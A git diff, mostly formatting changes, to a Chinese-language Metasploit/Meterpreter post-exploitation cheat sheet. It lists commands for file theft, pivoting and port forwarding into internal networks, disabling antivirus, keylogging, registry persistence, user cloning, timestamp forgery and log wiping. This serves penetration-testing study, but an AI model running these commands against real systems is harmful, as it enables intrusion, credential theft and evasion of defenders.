@@ -94,7 +94,9 @@ deb-src http://mirrors.aliyun.com/kali kali-experimental main non-free contrib
 也可以直接使用 `msfupdate`
 
 **Module database cache not built yet, using slow search**
-> 注: 5.0.0 之后应该就不需要这个了
+
+> 注: 5.0.0 之后就不需要这个了
+
 ```bash
 service postgresql start
 msfdb init
@@ -423,6 +425,7 @@ lls                 # 显示自己当前系统的所有文件和文件夹.
 ```
 
 **上传和下载**
+
 ```bash
 upload [file] [destination]         # 上传文件到 Windows 主机
 # 注意:使用 -r 参数可以递归上传上传目录和文件
@@ -433,11 +436,13 @@ download [file] [path to save]      # 从 windows 主机下载文件
 ```
 
 **搜索文件**
+
 ```bash
 search -f *config*
 ```
 
 **改变文件时间**
+
 ```bash
 timestomp -v a.txt                  # 查看 a 的时间戳
 timestomp a.txt -f b.txt            # 使用 b 的时间覆盖 a 的时间
@@ -460,6 +465,7 @@ exploit
 ## 端口转发和内网代理
 
 **网络命令**
+
 ```bash
 Ipconfig/ifconfig                   # 查看目标主机 IP 地址;
 arp -a                              # 用于查看高速缓存中的所有项目;
@@ -470,6 +476,7 @@ netstat -na                         # 可以显示所有连接的端口
 其中路由信息对于渗透者来说特有用,因为攻击机处于外网,目标主机处于内网,他们之间是不能通信的,故需要添加路由来把攻击机的 IP 添加到内网里面,这样我们就可以横扫内网,就是所谓的内网代理.
 
 首先我们需要获取网段,然后再添加路由,添加成功后就可以横向扫描内网主机.
+
 ```bash
 run get_local_subnets                   # 获取网段
 run autoroute -s 192.168.205.1/24       # 添加路由
@@ -480,6 +487,7 @@ meterpreter > background                # 后台 sessions
 ```
 
 或者自动化
+
 ```bash
 use post/multi/manage/autoroute
 set session 1
@@ -489,6 +497,7 @@ exploit
 **portfwd**
 
 portfwd 是 meterpreter 提供的端口转发功能,在 meterpreter 下使用 portfwd -h 命令查看该命令参数.
+
 ```bash
 portfwd add -l 2222 -r 1.1.1.1 -p 3389  # 将 1.1.1.3 的 3389 端口转发到本地的 2222 端口.
     -l:本地监听端口
@@ -506,12 +515,16 @@ portfwd add -l 3389 -r 192.168.161.138 -p 3389
 **pivot**
 
 pivot 是 msf 最常用的代理,可以让我们使用 msf 提供的扫描模块对内网进行探测.
+
 ```bash
 route add [ip] [mask] [session id]      # 添加一个路由
 route print
+```
 
 如果其它程序需要访问这个内网环境,就可以建立 socks 代理
+
 msf 提供了3个模块用来做 socks 代理.
+```
 auxiliary/server/socks4a
 auxiliary/server/socks5
 auxiliary/server/socks_unc
@@ -519,19 +532,22 @@ auxiliary/server/socks_unc
 use auxiliary/server/socks4a
 SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
 SRVPORT:监听的端口,默认为 1080.
-直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
 ```
+
+直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
 
 ---
 
 ## 权限维持
 
 **关闭防病毒软件**
+
 ```bash
 run killav
 ```
 
 **键盘记录**
+
 ```bash
 keyscan_start   # 开启键盘记录功能
 keyscan_dump    # 显示捕捉到的键盘记录信息
@@ -622,6 +638,7 @@ run vnc                             # 分段注入VNC DLL
 **注册表操作**
 
 通过注册表设置开机自启动
+
 ```bash
 reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 
@@ -633,6 +650,7 @@ reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note
 ```
 
 通过注册表复制克隆用户
+
 ```bash
 reg enumkey -k HKLM\\sam\\sam\\domains\\account\\users
 shell
@@ -649,6 +667,7 @@ clearev     # 入侵痕迹擦除
 ```
 
 **反电子取证**
+
 ```bash
 timestomp -v secist.txt                     # 查看当前目标文件 MACE 时间.
 timestomp -f c:\\AVScanner.ini secist.txt   # 将模板文件 MACE 时间,复制给当前文件
@@ -662,6 +681,7 @@ timestomp -v secist.txt
 > 以下部分内容来自 <sup>[探寻Metasploit Payload模式背后的秘密](https://www.freebuf.com/articles/system/187312.html)</sup>
 
 在 MSF 里有很相似的 metasploit payload,比如
+
 ```
 payload/windows/x64/meterpreter/reverse_tcp  normal  No  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
 payload/windows/x64/meterpreter_reverse_tcp  normal  No  Windows Meterpreter Shell, Reverse TCP Inline x64
